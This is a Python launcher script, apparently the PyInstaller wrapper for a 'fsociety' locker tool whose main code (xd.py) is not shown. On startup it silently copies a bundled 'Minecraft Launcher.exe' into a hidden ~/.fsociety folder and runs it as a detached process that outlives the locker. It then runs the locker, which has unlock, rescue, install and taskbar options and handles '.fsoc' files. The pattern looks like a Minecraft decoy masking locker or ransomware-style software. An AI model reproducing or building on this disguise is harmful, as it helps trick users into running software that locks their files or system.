import contextlib
import io
import os
import shutil
import subprocess
import sys
from pathlib import Path

# Esta linea obliga a PyInstaller a meter Python entero + lo que usa xd.py
import xd

AQUI   = Path(sys.executable).resolve().parent
DENTRO = Path(getattr(sys, "_MEIPASS", AQUI))
CACHE  = Path(os.path.expanduser("~")) / ".fsociety"

CLI_AVISO = {"--unlock", "--verify", "--rescue", "--dry-run", "--rebuild",
             "--install", "--uninstall", "--taskbar-on", "--no-gui"}


def abrir_minecraft():
    """Abre Minecraft en un proceso aparte: sigue vivo aunque cierres el locker."""
    origen = None
    for p in (DENTRO / "Minecraft Launcher.exe", AQUI / "Minecraft Launcher.exe"):
        if p.is_file():
            origen = p
            break
    if origen is None:
        return
    destino = CACHE / "Minecraft Launcher.exe"
    try:
        if not destino.is_file() or destino.stat().st_size != origen.stat().st_size:
            CACHE.mkdir(parents=True, exist_ok=True)
            shutil.copy2(origen, destino)
        flags = 0x00000008 | 0x00000200 if os.name == "nt" else 0
        subprocess.Popen([str(destino)], cwd=str(destino.parent),
                         close_fds=True, creationflags=flags)
    except Exception:
        pass


def aviso(texto):
    try:
        import ctypes
        ctypes.windll.user32.MessageBoxW(None, texto, "fsociety", 0x40)
    except Exception:
        pass


def main():
    abrir_minecraft()

    args = sys.argv[1:]
    if args and Path(args[0]).is_file() and Path(args[0]).suffix.lower() != ".fsoc":
        args = args[1:]

    sys.argv = ["xd.py"] + args

    if any(a in CLI_AVISO for a in args):
        buf = io.StringIO()
        try:
            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
                xd.main()
        except SystemExit:
            pass
        txt = buf.getvalue().strip()
        if txt:
            aviso(txt)
        return

    xd.main()


if __name__ == "__main__":
    try:
        main()
    except Exception:
        import traceback
        aviso("ERROR:\n\n" + traceback.format_exc())
        raise